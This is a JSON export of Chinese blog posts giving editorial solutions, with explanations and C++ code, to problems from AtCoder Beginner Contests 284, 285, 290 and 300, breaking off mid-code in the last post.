{"posts":[{"title":"AtCoder Beginner Contest 284【A - F】","text":"前几道题都比较简单， F 题感觉是字符串哈希，不过之前不了解没做出来，赛后看题解还可以用 Z Algorithm（扩展 KMP）。 比赛链接：https://atcoder.jp/contests/abc284/tasks A - Sequence of Strings 题解 模拟。 代码 123456789101112131415161718192021#include &lt;bits/stdc++.h&gt;using namespace std;int main() { ios::sync_with_stdio(false); cin.tie(nullptr); int n; cin &gt;&gt; n; vector&lt;string&gt; s(n); for (int i = 0; i &lt; n; i++) { cin &gt;&gt; s[i]; } for (int i = n - 1; i &gt;= 0; i--) { cout &lt;&lt; s[i] &lt;&lt; &quot;\\n&quot;; } return 0;} B - Multi Test Cases 题解 模拟。 代码 12345678910111213141516171819202122232425#include &lt;bits/stdc++.h&gt;using namespace std;int main() { ios::sync_with_stdio(false); cin.tie(nullptr); int t; cin &gt;&gt; t; while (t--) { int n; cin &gt;&gt; n; int odd = 0; for (int i = 0; i &lt; n; i++) { int x; cin &gt;&gt; x; odd += (x &amp; 1); } cout &lt;&lt; odd &lt;&lt; &quot;\\n&quot;; } return 0;} C - Count Connected Components 题解 模拟。 代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#include &lt;bits/stdc++.h&gt;using namespace std;struct dsu { vector&lt;int&gt; fa, sz; dsu(int n) : fa(n), sz(n) { iota(fa.begin(), fa.end(), 0); fill(sz.begin(), sz.end(), 1); } int Find(int x) { return fa[x] == x ? x : fa[x] = Find(fa[x]); } void Union(int x, int y) { x = Find(x), y = Find(y); if (x == y) { return; } if (sz[x] &lt; sz[y]) { swap(x, y); } sz[x] += sz[y]; fa[y] = x; } int Size(int x) { return fa[x] == x ? sz[x] : sz[x] = sz[Find(x)]; } bool diff(int x, int y) { return Find(x) != Find(y); }};int main() { ios::sync_with_stdio(false); cin.tie(nullptr); int n, m; cin &gt;&gt; n &gt;&gt; m; dsu dsu(n); for (int i = 0; i &lt; m; i++) { int u, v; cin &gt;&gt; u &gt;&gt; v; --u, --v; dsu.Union(u, v); } for (int i = 0; i &lt; n; i++) { dsu.fa[i] = dsu.Find(i); } cout &lt;&lt; set(dsu.fa.begin(), dsu.fa.end()).size() &lt;&lt; &quot;\\n&quot;; return 0;} D - Happy New Year 2023 题解 min(p,q)≤n3min(p, q) \\le \\sqrt[3]{n}min(p,q)≤3n​ ，当 n=9×1018n = 9 \\times 10^{18}n=9×1018 时， min(p,q)≤n3&lt;3×106min(p, q) \\le \\sqrt[3]{n} \\lt 3 \\times 10^6min(p,q)≤3n​&lt;3×106 ，所以筛出 3×1063 \\times 10^63×106 内的素数，枚举并讨论是 ppp 或 qqq 的两种情况即可。 代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include &lt;bits/stdc++.h&gt;using namespace std;constexpr int N = 3e6;vector&lt;bool&gt; is_prime(N, true);void Init() { is_prime[0] = is_prime[1] = false; for (int i = 2; i &lt; N; i++) { if (not is_prime[i]) { continue; } for (int j = i + i; j &lt; N; j += i) { is_prime[j] = false; } }}int main() { ios::sync_with_stdio(false); cin.tie(nullptr); Init(); vector&lt;long long&gt; primes; for (int i = 2; i &lt; N; i++) { if (is_prime[i]) { primes.push_back(i); } } int t; cin &gt;&gt; t; while (t--) { long long n; cin &gt;&gt; n; long long p = -1, q = -1; for (auto x : primes) { if (n % (x * x) == 0) { p = x, q = n / (x * x); } else if (n % x == 0) { p = sqrt(n / x), q = x; } } cout &lt;&lt; p &lt;&lt; ' ' &lt;&lt; q &lt;&lt; &quot;\\n&quot;; } return 0;} E - Count Simple Paths 题解 输出 min(k,106)min(k, 10^6)min(k,106) ，所以 dfs 模拟即可，加一个标记数组防止访问环。 代码 1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;bits/stdc++.h&gt;using namespace std;int main() { ios::sync_with_stdio(false); cin.tie(nullptr); int n, m; cin &gt;&gt; n &gt;&gt; m; vector&lt;vector&lt;int&gt;&gt; G(n); for (int i = 0; i &lt; m; i++) { int u, v; cin &gt;&gt; u &gt;&gt; v; --u, --v; G[u].push_back(v); G[v].push_back(u); } int ans = 0; vector&lt;bool&gt; vis(n); function&lt;void(int, int)&gt; dfs = [&amp;](int u, int p) { if (ans == 1E6) { return; } ans += 1; for (auto v : G[u]) { if (v != p and not vis[v]) { vis[v] = true; dfs(v, u); vis[v] = false; } } }; vis[0] = true; dfs(0, -1); vis[0] = false; cout &lt;&lt; ans &lt;&lt; &quot;\\n&quot;; return 0;} F - ABCBAC 题解 枚举 + 字符串哈希，由于中间有一个原串的反向串，所以需要正反向建立两个哈希。 代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485#include &lt;bits/stdc++.h&gt;using namespace std;const int L = 2e6 + 5;const int HASH_CNT = 2;int hashBase[HASH_CNT] = {29, 31}; // {13331, 23333}int hashMod[HASH_CNT] = {int(1e9 + 9), 998244353}; // {1e9 + 7, 1e9 + 9}struct StringWithHash { char s[L]; int ls; int hsh[HASH_CNT][L]; int pwMod[HASH_CNT][L]; void init() { // 初始化 ls = 0; for (int i = 0; i &lt; HASH_CNT; ++i) { hsh[i][0] = 0; pwMod[i][0] = 1; } } StringWithHash() { init(); } void extend(char c) { s[++ls] = c; // 记录字符数和每一个字符 for (int i = 0; i &lt; HASH_CNT; ++i) { // 双哈希的预处理 pwMod[i][ls] = 1ll * pwMod[i][ls - 1] * hashBase[i] % hashMod[i]; // 得到b^ls hsh[i][ls] = (1ll * hsh[i][ls - 1] * hashBase[i] + c) % hashMod[i]; } } vector&lt;int&gt; getHash(int l, int r) { // 得到哈希值 vector&lt;int&gt; res(HASH_CNT, 0); for (int i = 0; i &lt; HASH_CNT; ++i) { int t = (hsh[i][r] - 1ll * hsh[i][l - 1] * pwMod[i][r - l + 1]) % hashMod[i]; t = (t + hashMod[i]) % hashMod[i]; res[i] = t; } return res; }};StringWithHash H1, H2;int main() { ios::sync_with_stdio(false); cin.tie(nullptr); int n; cin &gt;&gt; n; n *= 2; string s; cin &gt;&gt; s; string t = string(s.rbegin(), s.rend()); for (int i = 0; i &lt; n; i++) { H1.extend(s[i]); H2.extend(t[i]); } int ans = -1; int l = 1, r = n / 2; while (r &lt;= n) { if ((l - 1 &lt; 1 or H1.getHash(1, l - 1) == H2.getHash(n - r + 1, n - r + 1 + (l - 2))) and (r + 1 &gt; n or H1.getHash(r + 1, n) == H2.getHash(n - r + 1 + (l - 1), n - r + 1 + (l - 1) + (n - r - 1)))) { ans = l - 1; break; } l += 1, r += 1; } if (ans == -1) { cout &lt;&lt; -1 &lt;&lt; &quot;\\n&quot;; } else { cout &lt;&lt; t.substr(n - r, n / 2) &lt;&lt; &quot;\\n&quot;; cout &lt;&lt; ans &lt;&lt; &quot;\\n&quot;; } return 0;}","link":"/2023/01/08/ABC%20284/"},{"title":"Toyota Programming Contest 2023 Spring Qual B（AtCoder Beginner Contest 290）【A - G】","text":"比赛时只做出了 4 题，挺有教育意义的一场 ABC 。 比赛链接：https://atcoder.jp/contests/abc290/tasks A - Contest Result 1234567891011121314151617181920212223242526#include &lt;bits/stdc++.h&gt;using namespace std;int main() { ios::sync_with_stdio(false); cin.tie(nullptr); int n, m; cin &gt;&gt; n &gt;&gt; m; vector&lt;int&gt; a(n); for (int i = 0; i &lt; n; i++) { cin &gt;&gt; a[i]; } int sum = 0; for (int i = 0; i &lt; m; i++) { int b; cin &gt;&gt; b; --b; sum += a[b]; } cout &lt;&lt; sum &lt;&lt; &quot;\\n&quot;; return 0;} B - Qual B 1234567891011121314151617181920212223#include &lt;bits/stdc++.h&gt;using namespace std;int main() { ios::sync_with_stdio(false); cin.tie(nullptr); int n, k; cin &gt;&gt; n &gt;&gt; k; string s; cin &gt;&gt; s; for (int i = 0, cnt = 0; i &lt; n; i++) { if (s[i] == 'o' and ++cnt &gt; k) { s[i] = 'x'; } } cout &lt;&lt; s &lt;&lt; &quot;\\n&quot;; return 0;} C - Max MEX 1234567891011121314151617181920212223242526#include &lt;bits/stdc++.h&gt;using namespace std;int main() { ios::sync_with_stdio(false); cin.tie(nullptr); int n, k; cin &gt;&gt; n &gt;&gt; k; vector&lt;int&gt; a(n); for (int i = 0; i &lt; n; i++) { cin &gt;&gt; a[i]; } sort(a.begin(), a.end()); int ans = 0; for (int i = 0; i &lt; n; i++) { if (ans == a[i]) { ans += 1; } } cout &lt;&lt; min(ans, k) &lt;&lt; &quot;\\n&quot;; return 0;} D - Marking 题解 当 gcd(d,n)=1gcd(d, n) = 1gcd(d,n)=1 时，答案为 k⋅d % nk \\cdot d\\ \\%\\ nk⋅d % n ； 当 gcd(d,n)≠1gcd(d, n) \\ne 1gcd(d,n)=1 时，答案为 k/ng+k % (n/g)∗dk / {\\frac{n}{g}} + k\\ \\%\\ (n / g) * dk/gn​+k % (n/g)∗d 。 代码 1234567891011121314151617181920212223242526272829303132#include &lt;bits/stdc++.h&gt;using namespace std;int main() { ios::sync_with_stdio(false); cin.tie(nullptr); #define int long long int t; cin &gt;&gt; t; while (t--) { int n, d, k; cin &gt;&gt; n &gt;&gt; d &gt;&gt; k; d %= n; k--; if (d == 0) { cout &lt;&lt; k &lt;&lt; &quot;\\n&quot;; continue; } if (gcd(d, n) == 1) { cout &lt;&lt; k * d % n &lt;&lt; &quot;\\n&quot;; } else { int g = gcd(d, n); cout &lt;&lt; (k / (n / g) + k % (n / g) * d) % n &lt;&lt; &quot;\\n&quot;; } } return 0;} E - Make it Palindrome 题解 在所有的连续子数组中一共有 ∑i=1n(n+1−len)×⌊len2⌋\\sum \\limits _{i = 1} ^{n} (n +1 - len) \\times \\lfloor \\frac{len}{2} \\rfloori=1∑n​(n+1−len)×⌊2len​⌋ 个中心对称的数对； 将值相同的数的下标存起来，利用双指针计算合法数对； 总数减去合法数即所求。 代码 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;bits/stdc++.h&gt;using namespace std;int main() { ios::sync_with_stdio(false); cin.tie(nullptr); #define int long long int n; cin &gt;&gt; n; vector&lt;vector&lt;int&gt;&gt; pos(n); for (int i = 0; i &lt; n; i++) { int x; cin &gt;&gt; x; --x; pos[x].push_back(i); } long long ans = 0; for (int i = 1; i &lt;= n; i++) { ans += (n - i + 1) * (i / 2); } for (auto vec : pos) { int l = 0, r = (int)vec.size() - 1; while (l &lt; r) { if (vec[l] + 1 &lt; n - vec[r]) { ans -= (r - l) * (vec[l] + 1); l++; } else { ans -= (r - l) * (n - vec[r]); r--; } } } cout &lt;&lt; ans &lt;&lt; &quot;\\n&quot;; return 0;} F - Maximum Diameter 题解 nnn 个结点的树有 n−1n - 1n−1 条边，所以需要首先满足度数和为 2(n−1)2(n - 1)2(n−1) 。 将所有度数 ≥2\\ge 2≥2 的结点连成一条线，之后将度数为 111 的结点补上，这种构造方法下的树直径最长，长度为 度数≥2的结点个数+1度数 \\ge 2 的结点个数 + 1度数≥2的结点个数+1 。 所求即 ∑合法方案(度数≥2的结点个数+1)\\sum \\limits _{合法方案} (度数 \\ge 2 的结点个数 + 1)合法方案∑​(度数≥2的结点个数+1) =合法方案数+∑合法方案(度数≥2的结点个数)= 合法方案数 + \\sum \\limits _{合法方案} (度数 \\ge 2 的结点个数)=合法方案数+合法方案∑​(度数≥2的结点个数) =合法方案数+∑i=1n(Xi≥2的合法方案数)= 合法方案数 + \\sum \\limits _{i = 1} ^{n} (X_i \\ge 2 的合法方案数)=合法方案数+i=1∑n​(Xi​≥2的合法方案数) =合法方案数+(X1≥2的合法方案数)×n= 合法方案数 + (X_1 \\ge 2 的合法方案数) \\times n=合法方案数+(X1​≥2的合法方案数)×n =C2n−3n−1+C2n−4n−1×n (插板法)= C_{2n - 3}^{n - 1} + C_{2n - 4}^{n - 1} \\times n\\ \\ \\ (插板法)=C2n−3n−1​+C2n−4n−1​×n (插板法) 代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#include &lt;bits/stdc++.h&gt;using namespace std;constexpr int N = 2e6 + 10;constexpr int MOD = 998244353;int norm(int x) { if (x &lt; 0) { x += MOD; } if (x &gt;= MOD) { x -= MOD; } return x; }template&lt;class T&gt; T binpow(T a, int b) { T res = 1; for (; b; b /= 2, a *= a) { if (b % 2) { res *= a; } } return res; }struct Z { int x; Z(int x = 0) : x(norm(x)) {} int val() const { return x; } Z operator-() const { return Z(norm(MOD - x)); } Z inv() const { assert(x != 0); return binpow(*this, MOD - 2); } Z &amp;operator*=(const Z &amp;rhs) { x = 1LL * x * rhs.x % MOD; return *this; } Z &amp;operator+=(const Z &amp;rhs) { x = norm(x + rhs.x); return *this; } Z &amp;operator-=(const Z &amp;rhs) { x = norm(x - rhs.x); return *this; } Z &amp;operator/=(const Z &amp;rhs) { return *this *= rhs.inv(); } friend Z operator*(const Z &amp;lhs, const Z &amp;rhs) { Z res = lhs; res *= rhs; return res; } friend Z operator+(const Z &amp;lhs, const Z &amp;rhs) { Z res = lhs; res += rhs; return res; } friend Z operator-(const Z &amp;lhs, const Z &amp;rhs) { Z res = lhs; res -= rhs; return res; } friend Z operator/(const Z &amp;lhs, const Z &amp;rhs) { Z res = lhs; res /= rhs; return res; }};struct Combination { vector&lt;Z&gt; fac, inv; Combination(int n) : fac(n), inv(n) { fac[0] = 1; for (int i = 1; i &lt; n; i++) fac[i] = fac[i - 1] * i; inv[n - 1] = fac[n - 1].inv(); for (int i = n - 2; i &gt;= 0; i--) inv[i] = inv[i + 1] * (i + 1); } Z C(int n, int m){ if(m &lt; 0 or m &gt; n) return 0; return fac[n] * inv[m] * inv[n - m]; } Z A(int n, int m){ if(m &lt; 0 or m &gt; n) return 0; return fac[n] * inv[n - m]; }};int main() { ios::sync_with_stdio(false); cin.tie(nullptr); Combination C(N); int t; cin &gt;&gt; t; while (t--) { int n; cin &gt;&gt; n; cout &lt;&lt; (C.C(2 * n - 3, n - 1) + C.C(2 * n - 4, n - 1) * n).val() &lt;&lt; &quot;\\n&quot;; } return 0;} G - Edge Elimination 题解 枚举在 kkk 叉树哪个深度的分支上。 代码 12345678910111213141516171819202122232425262728293031323334#include &lt;bits/stdc++.h&gt;using namespace std;int main() { ios::sync_with_stdio(false); cin.tie(nullptr); int t; cin &gt;&gt; t; while (t--) { long long d, k, x; cin &gt;&gt; d &gt;&gt; k &gt;&gt; x; vector&lt;long long&gt; pw(d + 1); pw[0] = 1; for (int i = 1; i &lt;= d; i++) { pw[i] = pw[i - 1] * k + 1; } long long ans = 1e18; for (int i = d; i &gt;= 0 and pw[i] &gt;= x; i--) { long long remain = pw[i] - x, cnt = (i == d ? 0 : 1); for (int j = i - 1; j &gt;= 0 and remain &gt; 0; j--) { cnt += remain / pw[j]; remain %= pw[j]; } ans = min(ans, cnt); } cout &lt;&lt; ans &lt;&lt; &quot;\\n&quot;; } return 0;}","link":"/2023/02/22/ABC-290/"},{"title":"AtCoder Beginner Contest 285【A - F】","text":"鸽了一周的题解。 比赛链接：https://atcoder.jp/contests/abc285 A - Edge Checker 2 题解 利用完全二叉树结点序号的性质判断。 代码 1234567891011121314#include &lt;bits/stdc++.h&gt;using namespace std;int main() { ios::sync_with_stdio(false); cin.tie(nullptr); int a, b; cin &gt;&gt; a &gt;&gt; b; cout &lt;&lt; (b / 2 == a ? &quot;Yes&quot; : &quot;No&quot;) &lt;&lt; &quot;\\n&quot;; return 0;} B - Longest Uncommon Prefix 题解 模拟。 代码 123456789101112131415161718192021222324252627#include &lt;bits/stdc++.h&gt;using namespace std;int main() { ios::sync_with_stdio(false); cin.tie(nullptr); int n; cin &gt;&gt; n; string s; cin &gt;&gt; s; for (int i = 1; i &lt; n; i++) { int res = 0; for (int j = 0; j &lt; n; j++) { if (j + i &lt; n and s[j + i] != s[j]) { res += 1; } else { break; } } cout &lt;&lt; res &lt;&lt; &quot;\\n&quot;; } return 0;} C - abc285_brutmhyhiizp 题解 二十六进制数。 代码 123456789101112131415161718#include &lt;bits/stdc++.h&gt;using namespace std;int main() { ios::sync_with_stdio(false); cin.tie(nullptr); string s; cin &gt;&gt; s; long long ans = 0; for (auto ch : s) { ans = ans * 26 + (ch - 'A' + 1); } cout &lt;&lt; ans &lt;&lt; &quot;\\n&quot;; return 0;} D - Change Usernames 题解 反向拓扑排序。 代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include &lt;bits/stdc++.h&gt;using namespace std;int main() { ios::sync_with_stdio(false); cin.tie(nullptr); int n; cin &gt;&gt; n; map&lt;string, vector&lt;string&gt;&gt; G; map&lt;string, int&gt; deg; for (int i = 0; i &lt; n; i++) { string u, v; cin &gt;&gt; u &gt;&gt; v; G[v].push_back(u); deg[u] += 1; deg[v] += 0; } queue&lt;string&gt; que; for (auto [str, x] : deg) { if (x == 0) { que.push(str); } } map&lt;string, bool&gt; vis; while (not que.empty()) { auto u = que.front(); que.pop(); vis[u] = true; for (auto v : G[u]) { if (--deg[v] == 0) { que.push(v); } } } bool ok = true; for (auto [str, x] : deg) { if (not vis[str]) { ok = false; } } cout &lt;&lt; (ok ? &quot;Yes&quot; : &quot;No&quot;) &lt;&lt; &quot;\\n&quot;; return 0;} E - Work or Rest 题解 当两个假期相隔 111 天时，之间的工作日有 a1a_1a1​ 当两个假期相隔 222 天时，之间的工作日有 a1+a1a_1 + a_1a1​+a1​ 当两个假期相隔 333 天时，之间的工作日有 a1+a2+a1a_1 + a_2 + a_1a1​+a2​+a1​ 当两个假期相隔 444 天时，之间的工作日有 a1+a2+a2+a1a_1 + a_2 + a_2 + a_1a1​+a2​+a2​+a1​ 当两个假期相隔 555 天时，之间的工作日有 a1+a2+a3+a2+a1a_1 + a_2 + a_3 + a_2 + a_1a1​+a2​+a3​+a2​+a1​ ………… 设 dp[i][j]dp[i][j]dp[i][j] 表示已经确定前 iii 天，目前有 jjj 天连续的工作日，则有状态转移方程： dp[i+1][j+1]=max(dp[i+1][j+1],dp[i][j])dp[i + 1][j + 1] = max(dp[i + 1][j + 1], dp[i][j])dp[i+1][j+1]=max(dp[i+1][j+1],dp[i][j]) ，含义为第 i+1i + 1i+1 天为工作日 dp[i+1][0]=max(dp[i+1][0],dp[i][j]+pre[j])dp[i + 1][0] = max(dp[i + 1][0], dp[i][j] + pre[j])dp[i+1][0]=max(dp[i+1][0],dp[i][j]+pre[j]) ，含义为第 i+1i + 1i+1 天为假期 其中， pre[i]pre[i]pre[i] 为连续 iii 天工作日的产能，递推公式为： pre[i]=pre[i−1]+a⌊(i+1)2⌋pre[i] = pre[i - 1] + a_{\\lfloor \\frac{(i + 1)}{2} \\rfloor}pre[i]=pre[i−1]+a⌊2(i+1)​⌋​ 。 答案即 max(dp[n][i]+pre[i])max(dp[n][i] + pre[i])max(dp[n][i]+pre[i]) 。 代码 12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;bits/stdc++.h&gt;using namespace std;int main() { ios::sync_with_stdio(false); cin.tie(nullptr); int n; cin &gt;&gt; n; vector&lt;int&gt; a(n); for (int i = 0; i &lt; n; i++) { cin &gt;&gt; a[i]; } vector&lt;long long&gt; pre(n); for (int i = 1; i &lt; n; i++) { pre[i] = pre[i - 1] + a[(i + 1) / 2 - 1]; } vector dp(n + 1, vector&lt;long long&gt;(n, -1)); dp[1][0] = 0; for (int i = 1; i &lt; n; i++) { for (int j = 0; j &lt; n; j++) { if (dp[i][j] == -1) { continue; } dp[i + 1][j + 1] = max(dp[i + 1][j + 1], dp[i][j]); dp[i + 1][0] = max(dp[i + 1][0], dp[i][j] + pre[j]); } } long long ans = LLONG_MIN; for (int i = 0; i &lt; n; i++) { ans = max(ans, dp[n][i] + pre[i]); } cout &lt;&lt; ans &lt;&lt; &quot;\\n&quot;; return 0;} F - Substring of Sorted String 题解 符合条件的子串的含义： 字母排列为升序 除去首尾种类的字母，中间其余类型字母的个数与整个字符串的相同 第一个条件可以用树状数组 query(l, l + query(l, r) - 1) == query(l, r) 逐个字母判断； 第二个条件可以用 query(l, r) == cnt[i] 逐个判断。 代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105#include &lt;bits/stdc++.h&gt;using namespace std;struct Fenwick_tree { vector&lt;int&gt; bit; Fenwick_tree(int n) : bit(n) {} void update(int pos, int val) { for (int i = pos; i &lt;= (int)bit.size(); i += i &amp; (-i)) { bit[i - 1] += val; } } int query(int l, int r) { return query(r) - query(l - 1); } int query(int pos) { int res = 0; for (int i = pos; i &gt;= 1; i -= i &amp; (-i)) { res += bit[i - 1]; } return res; }};int main() { ios::sync_with_stdio(false); cin.tie(nullptr); int n; cin &gt;&gt; n; string s; cin &gt;&gt; s; vector F(26, Fenwick_tree(n)); vector&lt;int&gt; cnt(26); for (int i = 0; i &lt; n; i++) { F[s[i] - 'a'].update(i + 1, 1); cnt[s[i] - 'a'] += 1; } int q; cin &gt;&gt; q; while (q--) { int op; cin &gt;&gt; op; if (op == 1) { int x; char c; cin &gt;&gt; x &gt;&gt; c; F[s[x - 1] - 'a'].update(x, -1); cnt[s[x - 1] - 'a'] -= 1; s[x - 1] = c; F[c - 'a'].update(x, 1); cnt[c - 'a'] += 1; } else { int l, r; cin &gt;&gt; l &gt;&gt; r; vector&lt;int&gt; ret(26); for (int i = 0; i &lt; 26; i++) { ret[i] = F[i].query(l, r); } auto occurence_equal = [&amp;](int l, int r) { int pl = 0, pr = 25; while (ret[pl] == 0) { pl += 1; } while (ret[pr] == 0) { pr -= 1; } for (int i = pl + 1; i &lt;= pr - 1; i++) { if (ret[i] != cnt[i]) { return false; } } return true; }; auto is_increasing = [&amp;](int l, int r) { for (int i = 0; i &lt; 26; i++) { if (F[i].query(l, l + ret[i] - 1) != ret[i]) { return false; } l += ret[i]; } return true; }; cout &lt;&lt; (occurence_equal(l, r) and is_increasing(l, r) ? &quot;Yes&quot; : &quot;No&quot;) &lt;&lt; &quot;\\n&quot;; } } return 0;}","link":"/2023/01/22/ABC-258/"},{"title":"ユニークビジョンプログラミングコンテスト2023 春 (AtCoder Beginner Contest 300)","text":"学到很多…… 比赛链接：https://atcoder.jp/contests/abc300/tasks A - N-choice question 代码 12345678910111213141516171819202122#include &lt;bits/stdc++.h&gt;using namespace std;int main() { ios::sync_with_stdio(false); cin.tie(nullptr); int n, a, b; cin &gt;&gt; n &gt;&gt; a &gt;&gt; b; for (int i = 0; i &lt; n; i++) { int c; cin &gt;&gt; c; if (c == a + b) { cout &lt;&lt; i + 1 &lt;&lt; &quot;\\n&quot;; return 0; } } return 0;} B - Same Map in the RPG World 题解 枚举 s,ts, ts,t 的值。 代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include &lt;bits/stdc++.h&gt;using namespace std;int main() { ios::sync_with_stdio(false); cin.tie(nullptr); int h, w; cin &gt;&gt; h &gt;&gt; w; vector a(h, vector&lt;char&gt;(w)), b(h, vector&lt;char&gt;(w)); for (int i = 0; i &lt; h; i++) { for (int j = 0; j &lt; w; j++) { cin &gt;&gt; a[i][j]; } } for (int i = 0; i &lt; h; i++) { for (int j = 0; j &lt; w; j++) { cin &gt;&gt; b[i][j]; } } auto cal = [&amp;](int s, int t) { auto c = a; for (int loop = 0; loop &lt; s; loop++) { auto d = c; for (int i = 0; i &lt; h; i++) { for (int j = 0; j &lt; w; j++) { d[i][j] = c[(i + 1) % h][j]; } } c = d; } for (int loop = 0; loop &lt; t; loop++) { auto d = c; for (int i = 0; i &lt; h; i++) { for (int j = 0; j &lt; w; j++) { d[i][j] = c[i][(j + 1) % w]; } } c = d; } return c; }; for (int i = 0; i &lt; h; i++) { for (int j = 0; j &lt; w; j++) { if (cal(i, j) == b) { cout &lt;&lt; &quot;Yes&quot; &lt;&lt; &quot;\\n&quot;; return 0; } } } cout &lt;&lt; &quot;No&quot; &lt;&lt; &quot;\\n&quot;; return 0;} C - Cross 题解 模拟。 代码 123456789101112131415161718192021222324252627282930313233343536#include &lt;bits/stdc++.h&gt;using namespace std;int main() { ios::sync_with_stdio(false); cin.tie(nullptr); int h, w; cin &gt;&gt; h &gt;&gt; w; vector&lt;string&gt; MP(h); for (int i = 0; i &lt; h; i++) { cin &gt;&gt; MP[i]; } vector&lt;int&gt; ans(min(h, w)); auto legal = [&amp;](int x, int y) { return 0 &lt;= x and x &lt; h and 0 &lt;= y and y &lt; w and MP[x][y] == '#'; }; for (int i = 0; i &lt; h; i++) { for (int j = 0; j &lt; w; j++) { int sz = 0; while (legal(i - sz, j - sz) and legal(i - sz, j + sz) and legal(i + sz, j - sz) and legal(i + sz, j + sz)) { sz += 1; } if (sz &gt;= 2) { ans[sz - 2] += 1; } } } for (int i = 0; i &lt; min(h, w); i++) { cout &lt;&lt; ans[i] &lt;&lt; &quot; \\n&quot;[i == min(h, w) - 1]; } return 0;} D - AABCC 题解 枚举 a,ba, ba,b 的值。 代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include &lt;bits/stdc++.h&gt;using namespace std;constexpr int N = 1e6 + 10;vector&lt;bool&gt; is_prime(N, true);vector&lt;long long&gt; primes;void Init() { is_prime[0] = is_prime[1] = false; for (int i = 2; i &lt; N; i++) { if (not is_prime[i]) { continue; } primes.push_back(i); for (int j = 2 * i; j &lt; N; j += i) { is_prime[j] = false; } }}int main() { ios::sync_with_stdio(false); cin.tie(nullptr); long long N; cin &gt;&gt; N; Init(); int n = primes.size(); long long ans = 0; for (int i = 0; i &lt; n; i++) { if (primes[i] &gt;= 252) { break; } for (int j = i + 1; j &lt; n; j++) { if (primes[j] &gt;= 10000) { break; } int k = upper_bound(primes.begin(), primes.end(), sqrt(N / primes[i] / primes[i] / primes[j])) - primes.begin() - 1; if (k &lt;= j or primes[i] * primes[i] * primes[j] * primes[k] * primes[k] &gt; N) { continue; } ans += k - j; } } cout &lt;&lt; ans &lt;&lt; &quot;\\n&quot;; return 0;} E - Dice Product 3 题解 设 dp[n]dp[n]dp[n] 为得到 nnn 的概率，则有： dp[n]=16(dp[n]+dp[n2]+dp[n3]+dp[n4]+dp[n5]+dp[n6])dp[n] = \\frac{1}{6}(dp[n] + dp[\\frac{n}{2}] + dp[\\frac{n}{3}] + dp[\\frac{n}{4}] + dp[\\frac{n}{5}] + dp[\\frac{n}{6}])dp[n]=61​(dp[n]+dp[2n​]+dp[3n​]+dp[4n​]+dp[5n​]+dp[6n​]) 化简得： dp[n]=15(dp[n2]+dp[n3]+dp[n4]+dp[n5]+dp[n6])dp[n] = \\frac{1}{5}(dp[\\frac{n}{2}] + dp[\\frac{n}{3}] + dp[\\frac{n}{4}] + dp[\\frac{n}{5}] + dp[\\frac{n}{6}])dp[n]=51​(dp[2n​]+dp[3n​]+dp[4n​]+dp[5n​]+dp[6n​]) 利用记忆化进行搜索。 代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;bits/stdc++.h&gt;using namespace std;constexpr int MOD = 998244353;int norm(int x) { if (x &lt; 0) { x += MOD; } if (x &gt;= MOD) { x -= MOD; } return x; }template&lt;class T&gt; T binpow(T a, int b) { T res = 1; for (; b; b /= 2, a *= a) { if (b % 2) { res *= a; } } return res; }struct Z { int x; Z(int x = 0) : x(norm(x)) {} int val() const { return x; } Z operator-() const { return Z(norm(MOD - x)); } Z inv() const { assert(x != 0); return binpow(*this, MOD - 2); } Z &amp;operator*=(const Z &amp;rhs) { x = 1LL * x * rhs.x % MOD; return *this; } Z &amp;operator+=(const Z &amp;rhs) { x = norm(x + rhs.x); return *this; } Z &amp;operator-=(const Z &amp;rhs) { x = norm(x - rhs.x); return *this; } Z &amp;operator/=(const Z &amp;rhs) { return *this *= rhs.inv(); } friend Z operator*(const Z &amp;lhs, const Z &amp;rhs) { Z res = lhs; res *= rhs; return res; } friend Z operator+(const Z &amp;lhs, const Z &amp;rhs) { Z res = lhs; res += rhs; return res; } friend Z operator-(const Z &amp;lhs, const Z &amp;rhs) { Z res = lhs; res -= rhs; return res; } friend Z operator/(const Z &amp;lhs, const Z &amp;rhs) { Z res = lhs; res /= rhs; return res; }};int main() { ios::sync_with_stdio(false); cin.tie(nullptr); long long n; cin &gt;&gt; n; map&lt;long long, Z&gt; mp; mp[1] = 1; function&lt;Z(long long)&gt; dfs = [&amp;](long long cur) { if (mp.count(cur)) { return mp[cur]; } else { Z res = 0; for (int i = 2; i &lt;= 6; i++) { if (cur % i == 0) { res += dfs(cur / i); } } return mp[cur] = res / 5; } }; cout &lt;&lt; dfs(n).val() &lt;&lt; &quot;\\n&quot;; return 0;} F - More Holidays 题解 observation：一定存在一种最优方案，操作后连续 o 的左端点在前 nnn 个字符内。 proof：假设存在一种最优方案不以前 nnn 个字符的左端点为起点，则可以操作的每个字符的位置都向左提前 nnn 个。 所以在前 nnn 个字符内枚举连续 o 的左端点，贪心地操作后面的 x 即可。 代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;bits/stdc++.h&gt;using namespace std;int main() { ios::sync_with_stdio(false); cin.tie(nullptr); long long n, m, k; cin &gt;&gt; n &gt;&gt; m &gt;&gt; k; string s; cin &gt;&gt; s; vector&lt;int&gt; cnt(n + 1); for (int i = 0; i &lt; n; i++) { cnt[i + 1] = cnt[i] + (s[i] == 'x'); } vector&lt;int&gt; pos; pos.push_back(-1); for (int i = 0; i &lt; n; i++) { if (s[i] == 'x') { pos.push_back(i); } } long long ans = 0; auto cal = [&amp;](int i) { int id = lower_bound(pos.begin(), pos.end(), i) - pos.begin(); long long res = i - pos[id - 1] - 1; long long suf = cnt[n] - cnt[i]; long long t_k = k; if (t_k &lt; suf) { return res + pos[id + t_k] - i; } else { res += n - i; t_k -= suf; res += t_k / cnt[n] * n; t_k %= cnt[n]; res += pos[t_k + 1]; return min(res, n - pos[id - 1] - 1 + (m - 